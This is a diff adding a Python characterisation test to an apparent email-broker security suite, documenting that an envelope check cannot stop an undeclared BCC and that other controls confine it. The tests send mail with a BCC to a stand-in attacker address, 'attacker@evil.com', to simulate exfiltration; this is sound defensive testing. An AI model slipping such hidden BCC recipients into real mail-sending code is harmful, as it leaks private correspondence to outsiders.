@@ -206,3 +206,47 @@ class TestRealAttackStillBlocked:
             shim.send(
                 "user@corp.com", "internal@corp.com", "hi", bcc="attacker@evil.com"
             )
+
+
+class TestEnvelopeCheckCannotFire:
+    """The `send()` envelope check is defence in depth, not the confinement.
+
+    `send()` computes `actual_accepted - all_declared`, but the probe only ever
+    asks about `all_declared`. With an honest probe the difference is empty by
+    construction, so this check can never be what stops an undeclared recipient.
+
+    Spelled out here so the CHANGELOG claim and the code agree: what confines an
+    undeclared recipient is NoAmp plus the capability scope. A test that reported
+    otherwise was monkeypatching `_smtp_probe` to invent an address the shim
+    never asked about — pinning the wiring, not the discovery.
+    """
+
+    def test_bcc_envelope_check_cannot_fire(
+        self, picky_mta: tuple[Any, _PickyMTA, int]
+    ) -> None:
+        """A wildcard mandate lets a BCC through — NoAmp is what must stop it.
+
+        This is a characterisation test, not an endorsement. If it ever starts
+        failing because the BCC was blocked, the envelope check has gained real
+        reach and both this test and the CHANGELOG need revisiting.
+        """
+        _ctrl, handler, port = picky_mta
+        from effect_broker.shim_email import RealEmailShim
+
+        broker = _allow_all_broker()
+        shim = RealEmailShim(
+            broker=broker, task_id="default", tool_name="t",
+            smtp_host="127.0.0.1", smtp_port=port,
+        )
+
+        handler.rcpt_log.clear()
+        shim.send(
+            "user@corp.com", "internal@corp.com", "hi", bcc="attacker@evil.com"
+        )
+
+        assert "attacker@evil.com" in handler.rcpt_log, (
+            "the envelope check is expected to stay silent for an honest probe: "
+            "it subtracts the declared set from a set the probe can only draw "
+            "from the declared set. If this assertion starts failing, the check "
+            "has gained reach and the CHANGELOG claim must be updated."
+        )
